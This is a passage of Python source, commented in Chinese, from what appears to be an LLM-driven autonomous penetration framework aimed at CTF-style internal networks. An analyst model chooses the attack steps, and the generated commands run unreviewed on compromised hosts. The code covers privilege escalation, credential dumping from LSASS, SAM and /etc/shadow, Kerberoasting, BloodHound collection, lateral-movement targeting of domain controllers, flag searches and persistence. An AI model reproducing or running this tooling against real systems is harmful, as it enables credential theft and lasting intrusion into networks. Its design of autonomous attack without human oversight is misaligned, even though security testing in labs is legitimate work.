    for cmd in commands:
        print(f"[PrivEsc] 执行: {cmd[:50]}...")
        result = execute_on_session(session, cmd, timeout=60)
        results.append({
            "cmd": cmd,
            "success": result.success,
            "output": result.output[:500]
        })

        if result.success:
            # 检查是否提权成功
            verify_cmd = "whoami /priv" if os_type == "windows" else "id"
            verify_result = execute_on_session(session, verify_cmd, timeout=10)

            if os_type == "windows":
                if "SeImpersonatePrivilege" in verify_result.output or "SYSTEM" in verify_result.output:
                    return {"success": True, "is_system": "SYSTEM" in verify_result.output}
            else:
                if "uid=0" in verify_result.output:
                    return {"success": True, "is_system": True}

    return {"success": False, "error": "所有提权尝试失败"}


def _execute_privesc_advanced(session: Dict, strategy: Dict) -> Dict:
    """使用高级操作模块执行提权"""
    if not ADVANCED_OPS_AVAILABLE:
        return {"success": False, "error": "高级操作模块不可用"}

    method = strategy.get("method", "")
    result = PrivilegeEscalation.attempt_escalation(session, method)

    return {
        "success": result.status == OperationStatus.SUCCESS,
        "is_system": result.status == OperationStatus.SUCCESS,
        "error": result.message if result.status != OperationStatus.SUCCESS else ""
    }


def _ai_credential_dump(state: Dict, session: Dict,
                        active_sessions: List, credentials: List,
                        shell_session: Dict) -> Dict:
    """AI驱动的凭据转储"""
    new_credentials = list(credentials)
    target = session.get("host", "")
    os_type = session.get("os_type", shell_session.get("os_type", "linux"))

    print(f"[CredDump] AI决策凭据收集策略...")

    # AI决策凭据收集方法
    prompt = f"""
决策凭据收集策略。

## 目标
- IP: {target}
- 系统: {os_type}
- 权限: 管理员

## 可用方法
{os_type == "windows" and "mimikatz, LSASS转储, SAM转储, DCSync" or "/etc/shadow, SSH密钥, 历史命令, 配置文件"}

## 输出格式 (JSON)
{{
    "methods": ["方法列表，按优先级"],
    "commands": ["命令列表"]
}}
"""

    try:
        response = llm_client.call_chat_completion(
            model=config.ANALYST_MODEL,
            messages=[{"role": "user", "content": prompt}],
            temperature=0.1,
            json_mode=True
        )

        if "```json" in response:
            response = response.split("```json")[1].split("```")[0]

        strategy = json.loads(response.strip())
        print(f"[CredDump] AI选择: {', '.join(strategy.get('methods', []))}")

    except Exception:
        strategy = {"methods": ["默认"], "commands": []}

    # 执行凭据收集
    if shell_session.get("session_id") and REMOTE_EXEC_AVAILABLE:
        session_manager = get_session_manager()
        exec_session = session_manager.get_session(shell_session["session_id"])

        if exec_session:
            for cmd in strategy.get("commands", []):
                try:
                    result = execute_on_session(exec_session, cmd, timeout=60)
                    if result.success:
                        # 解析凭据
                        parsed = _parse_credentials_from_output(result.output, os_type)
                        new_credentials.extend(parsed)
                except Exception:
                    pass

    # 使用高级模块作为备选
    if ADVANCED_OPS_AVAILABLE and not new_credentials:
        try:
            if os_type == "windows":
                result = CredentialDumper.dump_lsass(session)
                if result.status == OperationStatus.SUCCESS:
                    print(f"[CredDump] LSASS转储成功")
            else:
                result = CredentialDumper.dump_linux_hashes(session)
                if result.status == OperationStatus.SUCCESS:
                    hashes = result.data.get("hashes", [])
                    for h in hashes:
                        new_credentials.append({
                            "host": target,
                            "username": h.get("username"),
                            "hash": h.get("hash"),
                            "cred_type": "password_hash"
                        })
        except Exception as e:
            print(f"[CredDump] 失败: {e}")

    return {
        "active_sessions": active_sessions,
        "credentials": new_credentials if len(new_credentials) > len(credentials) else credentials,
        "execution_steps": state.get("execution_steps", 0) + 1
    }


def _parse_credentials_from_output(output: str, os_type: str) -> List[Dict]:
    """从命令输出解析凭据"""
    import re
    credentials = []

    # Windows凭据模式
    if os_type == "windows":
        # NTLM哈希
        ntlm_pattern = r"(\w+)::[\w]+:([a-f0-9]+):([a-f0-9]+)"
        for match in re.finditer(ntlm_pattern, output, re.IGNORECASE):
            credentials.append({
                "username": match.group(1),
                "hash": f"{match.group(2)}:{match.group(3)}",
                "cred_type": "ntlm"
            })
    else:
        # Linux shadow文件
        hash_pattern = r"(\w+):(\$[\w$\.\/]+)"
        for match in re.finditer(hash_pattern, output):
            credentials.append({
                "username": match.group(1),
                "hash": match.group(2),
                "cred_type": "password_hash"
            })

    return credentials


def _attempt_credential_dump(state: Dict, session: Dict,
                              active_sessions: List, credentials: List) -> Dict:
    """尝试凭据转储"""
    new_credentials = list(credentials)

    try:
        if session.get("os", "").lower() == "windows":
            # 尝试LSASS转储
            result = CredentialDumper.dump_lsass(session)
            if result.status == OperationStatus.SUCCESS:
                print(f"[CredDump] LSASS转储成功")
                # 解析获取的凭据（这里简化处理）
                # 实际应该解析result.data中的凭据

            # 尝试SAM转储
            result = CredentialDumper.dump_sam_system(session)
            if result.status in [OperationStatus.SUCCESS, OperationStatus.PARTIAL]:
                print(f"[CredDump] SAM/SYSTEM转储成功")
        else:
            # Linux 凭据转储
            result = CredentialDumper.dump_linux_hashes(session)
            if result.status == OperationStatus.SUCCESS:
                print(f"[CredDump] 获取到Linux密码哈希")
                hashes = result.data.get("hashes", [])
                for h in hashes:
                    new_credentials.append({
                        "host": session.get("host"),
                        "username": h.get("username"),
                        "hash": h.get("hash"),
                        "cred_type": "password_hash"
                    })

    except Exception as e:
        print(f"[CredDump] 凭据转储失败: {e}")

    return {
        "active_sessions": active_sessions,
        "credentials": new_credentials if len(new_credentials) > len(credentials) else credentials,
        "execution_steps": state.get("execution_steps", 0) + 1
    }


def credential_gather_node(state: Dict) -> Dict:
    """
    [凭据收集节点] AI驱动的凭据收集

    输入:
        - current_internal_target: 当前目标
        - internal_hosts: 已发现的主机
        - proxy_info: 代理信息
        - shell_session: 会话信息

    输出:
        - credentials: 收集到的凭据

    AI决策:
        1. 分析目标服务选择收集方法
        2. 决定是否需要使用代理
        3. 处理收集结果
    """
    target = state.get("current_internal_target", "")
    internal_hosts = state.get("internal_hosts") or []
    proxy_info = state.get("proxy_info", {})
    shell_session = state.get("shell_session", {})

    if not target:
        return {"error": "没有指定目标"}

    # 获取目标信息
    target_host = next(
        (h for h in internal_hosts if isinstance(h, dict) and h.get("ip") == target),
        None
    )

    if not target_host:
        return {
            "error": f"未找到目标 {target} 的信息",
            "failure_weighted_score": state.get("failure_weighted_score", 0) + 0.5
        }

    ports = target_host.get("ports") or []
    port_numbers = [p.get("port") for p in ports if isinstance(p, dict)]

    credentials = state.get("credentials") or []

    print(f"[CredGather] AI分析 {target} 的凭据收集策略...")

    # AI决策凭据收集策略
    gather_strategy = _ai_decide_cred_gather_strategy(target, target_host, credentials, state)

    print(f"[CredGather] AI决策: {gather_strategy.get('method')} - {gather_strategy.get('reason', '')}")

    new_credentials = []

    # 执行凭据收集
    method = gather_strategy.get("method", "")

    try:
        if method == "smb_anonymous":
            result = _execute_smb_anonymous(target, proxy_info)
            if result.get("success"):
                new_credentials.extend(result.get("credentials", []))

        elif method == "ldap_enum":
            result = _execute_ldap_enum(target, credentials, proxy_info)
            if result.get("success"):
                new_credentials.extend(result.get("credentials", []))

        elif method == "bloodhound":
            result = _execute_bloodhound(target, credentials, proxy_info)
            if result.get("success"):
                new_credentials.extend(result.get("credentials", []))
                return {
                    "credentials": credentials + new_credentials,
                    "analyst_intel": result.get("intel", ""),
                    "attack_paths": result.get("attack_paths", []),
                    "execution_steps": state.get("execution_steps", 0) + 1
                }

        elif method == "session_dump":
            if shell_session.get("session_id") and REMOTE_EXEC_AVAILABLE:
                result = _execute_session_cred_dump(shell_session)
                new_credentials.extend(result.get("credentials", []))

        elif method == "kerberoast":
            result = _execute_kerberoast(target, credentials, proxy_info)
            if result.get("success"):
                new_credentials.extend(result.get("credentials", []))

    except Exception as e:
        print(f"[CredGather] 执行失败: {e}")

    if new_credentials:
        print(f"[CredGather] 收集到 {len(new_credentials)} 条凭据")
    else:
        print(f"[CredGather] 未收集到新凭据")

    return {
        "credentials": credentials + new_credentials,
        "current_internal_target": target,
        "execution_steps": state.get("execution_steps", 0) + 1
    }


def _ai_decide_cred_gather_strategy(target: str, target_host: Dict, credentials: List, state: Dict) -> Dict:
    """
    AI决策凭据收集策略
    """
    ports = target_host.get("ports") or []
    port_numbers = [p.get("port") for p in ports if isinstance(p, dict)]

    # 压缩凭据信息
    has_domain_creds = any(c.get("domain") for c in credentials)
    creds_count = len(credentials)

    prompt = f"""
分析目标，决策最佳凭据收集策略。

## 目标信息
- IP: {target}
- 开放端口: {port_numbers}
- 已有凭据: {creds_count} 条
- 有域凭据: {'是' if has_domain_creds else '否'}

## 可用方法
- smb_anonymous: SMB匿名登录，无需凭据
- ldap_enum: LDAP枚举，需要域凭据
- bloodhound: BloodHound分析，需要域凭据
- session_dump: 会话凭据转储，需要有shell
- kerberoast: Kerberoasting，需要域凭据

## 输出格式 (JSON)
{{
    "method": "方法名称",
    "reason": "选择理由",
    "priority": "high/medium/low"
}}
"""

    try:
        response = llm_client.call_chat_completion(
            model=config.ANALYST_MODEL,
            messages=[{"role": "user", "content": prompt}],
            temperature=0.1,
            json_mode=True
        )

        if "```json" in response:
            response = response.split("```json")[1].split("```")[0]

        return json.loads(response.strip())

    except Exception as e:
        print(f"[CredGather] AI决策失败: {e}")
        # 降级: 基于端口选择
        if 445 in port_numbers:
            return {"method": "smb_anonymous", "reason": "SMB开放"}
        elif 389 in port_numbers and has_domain_creds:
            return {"method": "ldap_enum", "reason": "LDAP开放且有域凭据"}
        else:
            return {"method": "session_dump", "reason": "默认"}


def _execute_smb_anonymous(target: str, proxy_info: Dict) -> Dict:
    """执行SMB匿名登录"""
    try:
        result = ToolRegistry.execute_cached(
            "crackmapexec",
            target,
            {
                "target": target,
                "protocol": "smb",
                "action": "shares"
            }
        )

        if result and result.get("result", {}).get("success"):
            shares = result.get("result", {}).get("shares", [])
            return {
                "success": True,
                "credentials": [{"host": target, "type": "smb_anonymous"}]
            }
    except Exception:
        pass

    return {"success": False}


def _execute_ldap_enum(target: str, credentials: List, proxy_info: Dict) -> Dict:
    """执行LDAP枚举"""
    # 找一个域凭据
    domain_cred = next((c for c in credentials if c.get("domain")), None)
    if not domain_cred:
        return {"success": False}

    try:
        result = ToolRegistry.execute_cached(
            "bloodhound-python",
            target,
            {
                "domain": domain_cred.get("domain", ""),
                "dc": target,
                "username": domain_cred.get("username", ""),
                "password": domain_cred.get("password", ""),
                "hash": domain_cred.get("hash", "")
            }
        )

        if result and result.get("result", {}).get("success"):
            return {
                "success": True,
                "credentials": result.get("result", {}).get("credentials", [])
            }
    except Exception:
        pass

    return {"success": False}


def _execute_bloodhound(target: str, credentials: List, proxy_info: Dict) -> Dict:
    """执行BloodHound数据采集"""
    domain_cred = next((c for c in credentials if c.get("domain")), None)
    if not domain_cred:
        return {"success": False}

    try:
        result = ToolRegistry.execute_cached(
            "bloodhound",
            target,
            {
                "domain": domain_cred.get("domain", ""),
                "dc": target,
                "username": domain_cred.get("username", ""),
                "password": domain_cred.get("password", ""),
                "hash": domain_cred.get("hash", ""),
                "collection": "all"
            }
        )

        if result and result.get("result", {}).get("success"):
            bh_data = result.get("result", {})
            return {
                "success": True,
                "credentials": [],
                "intel": bh_data.get("summary", "BloodHound采集完成"),
                "attack_paths": bh_data.get("attack_paths", [])
            }
    except Exception:
        pass

    return {"success": False}


def _execute_session_cred_dump(shell_session: Dict) -> Dict:
    """通过会话执行凭据转储"""
    session_id = shell_session.get("session_id", "")
    os_type = shell_session.get("os_type", "linux")

    if not session_id:
        return {"credentials": []}

    session_manager = get_session_manager()
    session = session_manager.get_session(session_id)

    if not session:
        return {"credentials": []}

    credentials = []

    # AI生成凭据收集命令
    prompt = f"""
生成凭据收集命令。

## 系统
- 类型: {os_type}

## 要求
输出2-3个命令，用于收集敏感信息或凭据。
格式: JSON数组 ["cmd1", "cmd2"]
"""

    try:
        response = llm_client.call_chat_completion(
            model=config.ANALYST_MODEL,
            messages=[{"role": "user", "content": prompt}],
            temperature=0.1
        )

        if "```json" in response:
            response = response.split("```json")[1].split("```")[0]

        commands = json.loads(response.strip())

        for cmd in commands:
            result = execute_on_session(session, cmd, timeout=30)
            if result.success:
                # 解析凭据
                parsed = _parse_credentials_from_output(result.output, os_type)
                credentials.extend(parsed)

    except Exception:
        pass

    return {"credentials": credentials}


def _execute_kerberoast(target: str, credentials: List, proxy_info: Dict) -> Dict:
    """执行Kerberoasting"""
    domain_cred = next((c for c in credentials if c.get("domain")), None)
    if not domain_cred:
        return {"success": False}

    try:
        result = ToolRegistry.execute_cached(
            "impacket",
            target,
            {
                "script": "GetUserSPNs.py",
                "target": f"{domain_cred.get('domain')}/{domain_cred.get('username')}:{domain_cred.get('password')}@{target}"
            }
        )

        if result and result.get("result", {}).get("success"):
            # 解析Kerberoast哈希
            output = result.get("result", {}).get("output", "")
            # 简化: 检查是否有SPN
            if "$krb5tgs$" in output or "SPN" in output:
                return {
                    "success": True,
                    "credentials": [{"type": "kerberoast_hash", "data": output[:500]}]
                }
    except Exception:
        pass

    return {"success": False}


def flag_search_node(state: Dict) -> Dict:
    """
    [Flag搜索节点] 在已攻陷主机的管理员文件夹中搜索Flag

    输入:
        - active_sessions: 活跃会话
        - compromised_hosts: 已攻陷主机列表
        - shell_session: Shell会话信息

    输出:
        - found_flags: 发现的flag列表
        - compromised_hosts: 更新已攻陷主机

    工作流程:
        1. 遍历所有已攻陷主机
        2. 在管理员文件夹中搜索flag
        3. 收集所有发现的flag
        4. 标记主机已完成flag搜索
    """
    active_sessions = state.get("active_sessions") or []
    shell_session = state.get("shell_session", {})
    compromised_hosts = state.get("compromised_hosts") or []
    found_flags = state.get("found_flags") or []

    if not active_sessions and not shell_session:
        return {
            "error": "没有可用的会话进行Flag搜索",
            "failure_weighted_score": state.get("failure_weighted_score", 0) + 0.5
        }

    print(f"[FlagSearch] 开始在已攻陷主机中搜索Flag...")

    # 收集新发现的flag
    new_flags = []
    newly_compromised = []

    # 获取会话信息
    session_id = shell_session.get("session_id", "")
    os_type = shell_session.get("os_type", "linux")
    current_target = shell_session.get("target", "")

    if REMOTE_EXEC_AVAILABLE and session_id:
        session_manager = get_session_manager()
        session = session_manager.get_session(session_id)

        if session:
            # 在当前主机的管理员文件夹中搜索flag
            flags_found = _search_flags_on_host(session, os_type, current_target)
            new_flags.extend(flags_found)

            if current_target and current_target not in compromised_hosts:
                newly_compromised.append(current_target)

    # 遍历其他活跃会话
    for sess in active_sessions:
        host = sess.get("host", "")
        sess_os = sess.get("os_type", os_type)

        if host and host in compromised_hosts:
            continue  # 已经搜索过

        # 如果有远程执行能力，尝试搜索
        if REMOTE_EXEC_AVAILABLE and sess.get("session_id"):
            session_manager = get_session_manager()
            remote_session = session_manager.get_session(sess["session_id"])

            if remote_session:
                flags_found = _search_flags_on_host(remote_session, sess_os, host)
                new_flags.extend(flags_found)

                if host not in compromised_hosts:
                    newly_compromised.append(host)

    # 去重
    new_flags = list(set(new_flags))
    newly_compromised = list(set(newly_compromised))

    if new_flags:
        print(f"[FlagSearch] 发现 {len(new_flags)} 个Flag!")
        for flag in new_flags:
            print(f"   🚩 {flag}")

    # 决定下一步
    all_compromised = compromised_hosts + newly_compromised
    internal_hosts = state.get("internal_hosts") or []
    unexplored = [h.get("ip") for h in internal_hosts if isinstance(h, dict) and h.get("ip") not in all_compromised]

    if unexplored:
        next_phase = "lateral_move"
        print(f"[FlagSearch] 还有 {len(unexplored)} 台主机未攻陷，继续横向移动")
    else:
        next_phase = "complete"
        print(f"[FlagSearch] 所有内网主机已攻陷，内网渗透完成")

    return {
        "found_flags": new_flags,
        "compromised_hosts": newly_compromised,
        "current_compromise_phase": next_phase,
        "execution_steps": state.get("execution_steps", 0) + 1
    }


def _search_flags_on_host(session, os_type: str, host: str) -> List[str]:
    """
    AI驱动的Flag搜索

    让AI分析环境后决定搜索策略，而非硬编码路径
    """
    import re
    from flag_extractor import extract_flags_from_text

    flags = []

    # Step 1: AI收集环境信息
    env_probe_cmds = {
        "windows": [
            ("whoami", "当前用户"),
            ("dir C:\\", "C盘根目录"),
            ("echo %USERPROFILE%", "用户目录"),
            ("set", "环境变量"),
        ],
        "linux": [
            ("whoami", "当前用户"),
            ("ls -la /", "根目录"),
            ("env", "环境变量"),
            ("find /tmp -type f 2>/dev/null | head -20", "临时文件"),
        ]
    }

    env_info = {}
    for cmd, purpose in env_probe_cmds.get(os_type, env_probe_cmds["linux"]):
        try:
            result = execute_on_session(session, cmd, timeout=10)
            if result.success:
                env_info[purpose] = result.output[:500]
        except:
            pass

    # Step 2: AI决定搜索策略
    prompt = f"""分析目标环境，生成flag搜索策略。

目标主机: {host}
系统类型: {os_type}

环境信息:
{json.dumps(env_info, ensure_ascii=False, indent=2)}

生成搜索命令。考虑:
1. 常见CTF flag位置 (/flag, C:\\flag.txt, 桌面, 用户目录)
2. 特殊命名的文件 (flag.txt, flag, key.txt)
3. 环境变量中的flag
4. 隐藏文件
5. 近期修改的文件

输出JSON:
{{
    "search_commands": [
        {{"cmd": "具体命令", "purpose": "搜索目的", "priority": 1-5}}
    ],
    "expected_locations": ["预期flag可能的位置"]
}}"""

    try:
        response = llm_client.call_chat_completion(
            model=config.ANALYST_MODEL,
            messages=[{"role": "user", "content": prompt}],
            temperature=0.2,
            json_mode=True
        )

        if "```json" in response:
            response = response.split("```json")[1].split("```")[0]

        strategy = json.loads(response.strip())
        search_commands = sorted(strategy.get("search_commands", []),
                                key=lambda x: x.get("priority", 5))

    except Exception as e:
        logger.warning(f"AI搜索策略生成失败: {e}")
        # 降级到基础搜索
        if os_type == "windows":
            search_commands = [
                {"cmd": "type C:\\flag.txt", "purpose": "根目录flag文件", "priority": 1},
                {"cmd": "type C:\\flags\\flag.txt", "purpose": "flags目录", "priority": 2},
            ]
        else:
            search_commands = [
                {"cmd": "cat /flag 2>/dev/null", "purpose": "根目录flag", "priority": 1},
                {"cmd": "cat /flag.txt 2>/dev/null", "purpose": "flag.txt", "priority": 2},
            ]

    # Step 3: 执行搜索
    for search_action in search_commands[:10]:  # 最多执行10个搜索命令
        cmd = search_action.get("cmd", "")
        if not cmd:
            continue

        try:
            result = execute_on_session(session, cmd, timeout=30)
            if result.success and result.output:
                # 提取flag
                found = extract_flags_from_text(result.output)
                if found:
                    flags.extend(found)
                    logger.info(f"在 {host} 发现flag: {found[0][:30]}...")
                    break  # 找到flag就停止
        except Exception as e:
            logger.debug(f"搜索命令失败: {cmd} - {e}")
            continue

    return list(set(flags))


def _identify_suspicious_files(output: str, os_type: str) -> List[str]:
    """
    从目录列表中识别可疑文件

    可疑文件特征:
    - 包含flag关键字的文件名
    - txt文件
    - 隐藏文件
    """
    import re

    suspicious = []

    # 文件名模式
    suspicious_patterns = [
        r'flag',
        r'key',
        r'secret',
        r'password',
        r'credential',
        r'\.txt$',
        r'\.ini$',
        r'\.conf$',
        r'\.cfg$',
    ]

    lines = output.strip().split('\n')

    for line in lines:
        # 提取文件名
        if os_type == "windows":
            # Windows dir输出: 文件名直接显示
            parts = line.split()
            if parts:
                filename = parts[-1]  # 最后一个部分通常是文件名
        else:
            # Linux ls -la输出: 权限 链接 所属 组 大小 月 日 时间 文件名
            parts = line.split()
            if len(parts) >= 9:
                filename = parts[-1]
            else:
                filename = line.strip()

        # 检查是否匹配可疑模式
        for pattern in suspicious_patterns:
            if re.search(pattern, filename, re.IGNORECASE):
                suspicious.append(filename)
                break

    return suspicious[:10]  # 限制数量


def get_next_internal_target(state: Dict) -> str:
    """
    获取下一个需要攻陷的内网目标

    优先级:
    1. 未攻陷的高价值主机 (域控、数据库)
    2. 未攻陷的普通主机
    3. 空字符串 (所有主机已攻陷)
    """
    internal_hosts = state.get("internal_hosts") or []
    compromised_hosts = state.get("compromised_hosts") or []
    active_sessions = state.get("active_sessions") or []

    # 从活跃会话中也获取已攻陷主机
    session_hosts = [s.get("host") for s in active_sessions if s.get("host")]
    all_compromised = set(compromised_hosts + session_hosts)

    # 高价值端口
    high_value_ports = [88, 389, 636, 3268, 1433, 3306, 5432, 445]

    # 优先选择高价值目标
    for host in internal_hosts:
        if not isinstance(host, dict):
            continue
        ip = host.get("ip", "")
        if not ip or ip in all_compromised:
            continue

        ports = host.get("ports") or []
        port_numbers = [p.get("port") for p in ports if isinstance(p, dict) and p.get("port")]

        if any(p in port_numbers for p in high_value_ports):
            return ip

    # 选择第一个未攻陷的主机
    for host in internal_hosts:
        if not isinstance(host, dict):
            continue
        ip = host.get("ip", "")
        if ip and ip not in all_compromised:
            return ip

    return ""  # 所有主机已攻陷


def persistence_node(state: Dict) -> Dict:
    """
    AI驱动的持久化节点

    在攻陷主机后建立持久化访问，确保会话不会丢失
    设计原则: 简洁、AI驱动、无硬编码规则
    """
    if not ADVANCED_OPS_AVAILABLE:
        logger.warning("Advanced operations not available, skipping persistence")
        return {"persistence_established": False}

    active_sessions = state.get("active_sessions") or []

    if not active_sessions:
        return {"persistence_established": False}

    updates = {
        "persistence_results": [],
        "persistence_established": False
    }

    # 为每个活跃会话建立持久化
    for session in active_sessions[-2:]:  # 最多处理最近2个会话
        host = session.get("host", "unknown")

        # 调用AI驱动的持久化处理器
        result = PersistenceHandler.establish_persistence(session)

        persistence_record = {
            "host": host,
            "success": result.status == OperationStatus.SUCCESS,
            "method": result.data.get("method") if result.data else None,
            "message": result.message
        }
        updates["persistence_results"].append(persistence_record)

        if persistence_record["success"]:
            updates["persistence_established"] = True
            logger.info(f"[Persistence] {host}: {result.message}")

    return updates